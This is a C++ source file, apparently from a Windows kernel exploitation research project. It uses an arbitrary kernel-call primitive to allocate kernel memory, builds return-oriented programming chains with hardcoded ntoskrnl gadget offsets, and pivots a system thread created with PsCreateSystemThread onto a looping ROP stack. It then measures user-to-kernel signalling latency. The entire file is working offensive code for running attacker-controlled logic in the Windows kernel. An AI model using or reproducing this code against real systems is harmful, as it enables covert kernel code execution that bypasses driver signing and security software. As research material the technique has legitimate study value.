#include <include/driver/arbitrary_call.hpp>
#include <include/utils/utils.hpp>
#include <iostream>
#include <include/stack/stack_manager.hpp>
#include <include/globals.hpp>
#include <numeric>

#ifdef _MSC_VER
#pragma pack(push, 1)
#endif
struct PivotData
{
    uint8_t Padding1[0x10];
    void* NewRsp;           // Offset 0x10: New stack pointer
    void* NewRbp;           // Offset 0x18: New base pointer
    uint8_t Padding2[0x30];
    void* JumpAddress;      // Offset 0x50: Jump target (rdx)
};
#if defined(__GNUC__) || defined(__clang__)
__attribute__((packed))
#endif
;
#ifdef _MSC_VER
#pragma pack(pop)
#endif

static_assert(offsetof(PivotData, NewRsp) == 0x10, "NewRsp offset must be 0x10");
static_assert(offsetof(PivotData, NewRbp) == 0x18, "NewRbp offset must be 0x18");
static_assert(offsetof(PivotData, JumpAddress) == 0x50, "JumpAddress offset must be 0x50");
static_assert(sizeof(PivotData) == 0x58, "PivotData size must be 0x58");

void MeasureCommunicationSpeed(HANDLE UmEvent, HANDLE KmEvent, int iterations = 1000) {
    // Initialize high-resolution timer
    LARGE_INTEGER frequency, start, end;
    QueryPerformanceFrequency(&frequency);
    double freq = static_cast<double>(frequency.QuadPart); // Ticks per second

    // Vector to store latency for each cycle (in seconds)
    std::vector<double> latencies;
    latencies.reserve(iterations);

    // Measurement loop
    for (int i = 0; i < iterations; ++i) {
        QueryPerformanceCounter(&start); // Start timing
        SetEvent(UmEvent);              // Signal UM event
        WaitForSingleObject(KmEvent, INFINITE); // Wait for KM response
        QueryPerformanceCounter(&end);  // End timing

        // Calculate latency in seconds
        double latency = static_cast<double>(end.QuadPart - start.QuadPart) / freq;
        latencies.push_back(latency);
    }

    // Compute statistics
    double sum = std::accumulate(latencies.begin(), latencies.end(), 0.0);
    double average_latency = sum / iterations;
    double speed_hz = 1.0 / average_latency; // Cycles per second
    double min_latency = *std::min_element(latencies.begin(), latencies.end());
    double max_latency = *std::max_element(latencies.begin(), latencies.end());

    // Print results
    std::printf("Measured %d communication cycles:\n", iterations);
    std::printf("Total time: %.3f seconds\n", sum);
    std::printf("Average latency: %.3f ms (%.3f us)\n", average_latency * 1000.0, average_latency * 1000000.0);
    std::printf("Communication speed: %.2f cycles/second (Hz)\n", speed_hz);
    std::printf("Min latency: %.3f ms\n", min_latency * 1000.0);
    std::printf("Max latency: %.3f ms\n", max_latency * 1000.0);
}

int main()
{
    if (!Utils::EnableDebugPrivilege())
    {
        std::exception("Failed to enable debug privileges");
        return EXIT_FAILURE;
    }

    const std::uintptr_t RandomValidThreadAddress = Utils::FindRandomValidThreadAddress();
    if (!RandomValidThreadAddress)
    {
        std::exception("Failed to find a random valid thread address");
        return EXIT_FAILURE;
    }

    Globals::WindowsBuild = Utils::GetWindowsDisplayVersion();
    if (Globals::WindowsBuild.empty())
    {
        std::exception("Failed to find the windows build being used");
        return EXIT_FAILURE;
    }

    Globals::KernelBase = Driver::GetKernelModuleBase();
    if (!Globals::KernelBase)
    {
        std::exception("Failed to find ntoskrnl.exe base");
        return EXIT_FAILURE;
    }

    std::printf("[+] Windows build: %s\n", Globals::WindowsBuild.c_str());
    std::printf("[+] New thread address to be used @ 0x%p\n", RandomValidThreadAddress);
    std::printf("[+] ntoskrnl.exe @ 0x%p\n", Globals::KernelBase);

    Driver::ArbitraryCaller KernelCaller = Driver::ArbitraryCaller("NtReadFileScatter");

    void* PivotDataAllocation = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", sizeof(PivotData), reinterpret_cast<void*>(MAXULONG64));
    void* UmDestinationStringArg = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x20, reinterpret_cast<void*>(MAXULONG64));
    void* UmSourceStringArg = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x20, reinterpret_cast<void*>(MAXULONG64));
    void* UmObjectAttributeArg = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", sizeof(OBJECT_ATTRIBUTES), reinterpret_cast<void*>(MAXULONG64));
    void* UmOutputHandleArg = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x8, reinterpret_cast<void*>(MAXULONG64));
    void* KmDestinationStringArg = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x20, reinterpret_cast<void*>(MAXULONG64));
    void* KmSourceStringArg = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x20, reinterpret_cast<void*>(MAXULONG64));
    void* KmObjectAttributeArg = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", sizeof(OBJECT_ATTRIBUTES), reinterpret_cast<void*>(MAXULONG64));
    void* KmOutputHandleArg = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x8, reinterpret_cast<void*>(MAXULONG64));
    void* MainStackAllocation = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x6000, reinterpret_cast<void*>(MAXULONG64));
    void* InitStackAllocation = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x6000, reinterpret_cast<void*>(MAXULONG64));
    Globals::DummyMemoryAllocation = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x8, reinterpret_cast<void*>(MAXULONG64));
    Globals::CurrentStackOffsetAddress = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x8, reinterpret_cast<void*>(MAXULONG64));
    Globals::StackLimitStoreAddress = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x8, reinterpret_cast<void*>(MAXULONG64));

    std::printf("[+] Main Stack @ 0x%p\n", MainStackAllocation);
    std::printf("[+] Init Stack @ 0x%p\n", InitStackAllocation);
    std::printf("[+] Current Stack Offset @ 0x%p\n", Globals::CurrentStackOffsetAddress);

    if (!MainStackAllocation || !InitStackAllocation || !PivotDataAllocation || !Globals::CurrentStackOffsetAddress || !Globals::StackLimitStoreAddress)
        return EXIT_FAILURE;

    // Zero out stack allocation
    KernelCaller.Call<void*, void*, std::size_t>("RtlZeroMemory", MainStackAllocation, 0x6000);
    KernelCaller.Call<void*, void*, std::size_t>("RtlZeroMemory", InitStackAllocation, 0x6000);
    KernelCaller.Call<void*, void*, std::size_t>("RtlZeroMemory", Globals::CurrentStackOffsetAddress, 0x8);

    // Create kernelmode event
    const wchar_t* KmEventNameString = L"\\BaseNamedObjects\\Global\\MYSIGNALEVENT_KM";
    HANDLE KmEvent = CreateEventW(NULL, FALSE, FALSE, L"Global\\MYSIGNALEVENT_KM");
    std::printf("[+] Kernelmode event handle: %x\n", KmEvent);

    // Create usermode event
    const wchar_t* UmEventNameString = L"\\BaseNamedObjects\\Global\\MYSIGNALEVENT_UM";
    HANDLE UmEvent = CreateEventW(NULL, FALSE, FALSE, L"Global\\MYSIGNALEVENT_UM");
    std::printf("[+] Usermode event handle: %x\n", UmEvent);

    StackManager MainStackManager(Globals::KernelBase, (std::uintptr_t)MainStackAllocation + 0x2000, 0x2000);
    StackManager InitStackManager(Globals::KernelBase, (std::uintptr_t)InitStackAllocation + 0x2000, 0x2000);

    // Open handle to usermode event in the kernel
    InitStackManager.AddFunctionCall("RtlInitUnicodeString", (std::uint64_t)UmDestinationStringArg, (std::uint64_t)UmSourceStringArg);
    InitStackManager.AddFunctionCall("ZwOpenEvent", (std::uint64_t)UmOutputHandleArg, EVENT_MODIFY_STATE | SYNCHRONIZE, (std::uint64_t)UmObjectAttributeArg);

    InitStackManager.AddFunctionCall("RtlInitUnicodeString", (std::uint64_t)KmDestinationStringArg, (std::uint64_t)KmSourceStringArg);
    InitStackManager.AddFunctionCall("ZwOpenEvent", (std::uint64_t)KmOutputHandleArg, EVENT_MODIFY_STATE | SYNCHRONIZE, (std::uint64_t)KmObjectAttributeArg);

    InitStackManager.PivotToNewStack(MainStackManager);

    // set first arg
    MainStackManager.ReadIntoRcx((std::uint64_t)UmOutputHandleArg);
    // set second arg
    MainStackManager.SetRdx(TRUE);
    // set third arg
    MainStackManager.SetR8(NULL);

    MainStackManager.AddFunctionCall("ZwWaitForSingleObject");

    MainStackManager.ReadIntoRcx((std::uint64_t)KmOutputHandleArg);
    MainStackManager.SetRdx(NULL);
    MainStackManager.AddFunctionCall("ZwSetEvent");

    MainStackManager.LoopBack();

    OBJECT_ATTRIBUTES UmObjectAttributesData;
    InitializeObjectAttributes(&UmObjectAttributesData, (UNICODE_STRING*)UmDestinationStringArg, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    OBJECT_ATTRIBUTES KmObjectAttributesData;
    InitializeObjectAttributes(&KmObjectAttributesData, (UNICODE_STRING*)KmDestinationStringArg, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    std::uint64_t CurrentStackOffsetStartValue = 0x2000;

    void* RetGadgetAddress = reinterpret_cast<void*>(Globals::KernelBase + 0x20043b);
    void* NewRspAddress = reinterpret_cast<void*>(reinterpret_cast<std::uint64_t>(InitStackAllocation) + 0x2000);

    PivotData BootstrapPivotData = {};
    // Set RSP to the allocation of the first stack we will be execution, the 'initialization' stack.
    BootstrapPivotData.NewRsp = NewRspAddress;
    // RBP can be whatever, it's value doesn't seem to be affecting anything of importance to us.
    BootstrapPivotData.NewRbp = NULL;
    // Address we will be jumping to once the bootstrap gadget is done
    // executing. We will just 'ret;' into the first gadget in our new stack.
    BootstrapPivotData.JumpAddress = RetGadgetAddress;

    KernelCaller.Call<void*, void*, void*, std::size_t>("memcpy", PivotDataAllocation, &BootstrapPivotData, sizeof(PivotData));
    KernelCaller.Call<void*, void*, void*, std::size_t>("memcpy", UmSourceStringArg, (void*)UmEventNameString, (lstrlenW(UmEventNameString) + 1) * sizeof(WCHAR));
    KernelCaller.Call<void*, void*, void*, std::size_t>("memcpy", UmObjectAttributeArg, &UmObjectAttributesData, sizeof(OBJECT_ATTRIBUTES));
    KernelCaller.Call<void*, void*, void*, std::size_t>("memcpy", KmSourceStringArg, (void*)KmEventNameString, (lstrlenW(KmEventNameString) + 1) * sizeof(WCHAR));
    KernelCaller.Call<void*, void*, void*, std::size_t>("memcpy", KmObjectAttributeArg, &KmObjectAttributesData, sizeof(OBJECT_ATTRIBUTES));
    KernelCaller.Call<void*, void*, void*, std::size_t>("memcpy", Globals::CurrentStackOffsetAddress, &CurrentStackOffsetStartValue, sizeof(CurrentStackOffsetStartValue));
    KernelCaller.Call<void*, void*, void*, std::size_t>("memcpy", (void*)((std::uintptr_t)MainStackAllocation + 0x2000), MainStackManager.GetStackBuffer(), MainStackManager.GetStackSize());
    KernelCaller.Call<void*, void*, void*, std::size_t>("memcpy", (void*)((std::uintptr_t)InitStackAllocation + 0x2000), InitStackManager.GetStackBuffer(), InitStackManager.GetStackSize());

    Sleep(500);
    std::cin.get();

    // mov rdx, qword ptr [rcx + 0x50]; mov rbp, qword ptr [rcx + 0x18]; mov rsp, qword ptr [rcx + 0x10]; jmp rdx;
    void* BootstrapGadget = (void*)(Globals::KernelBase + 0x698bd0);

    HANDLE KernelThreadHandle;
    NTSTATUS ThreadCreationStatus = KernelCaller.Call<NTSTATUS, HANDLE*, ULONG, OBJECT_ATTRIBUTES*, HANDLE, void*, void*, void*>(
        "PsCreateSystemThread",
        &KernelThreadHandle,
        THREAD_ALL_ACCESS,
        NULL,
        NULL,
        NULL,
        BootstrapGadget,
        PivotDataAllocation
    );

    if (!NT_SUCCESS(ThreadCreationStatus))
    {
        std::printf("[-] PsCreateSystemThread failed with status: 0x%X\n", ThreadCreationStatus);
        return EXIT_FAILURE;
    }

    KernelCaller.Call<void*, HANDLE>("ZwClose", KernelThreadHandle);

    printf("Starting 1s\n");
    Sleep(1000);
    printf("Start\n");

    MeasureCommunicationSpeed(UmEvent, KmEvent, 1000000);

    std::cin.get();

    return EXIT_SUCCESS;
}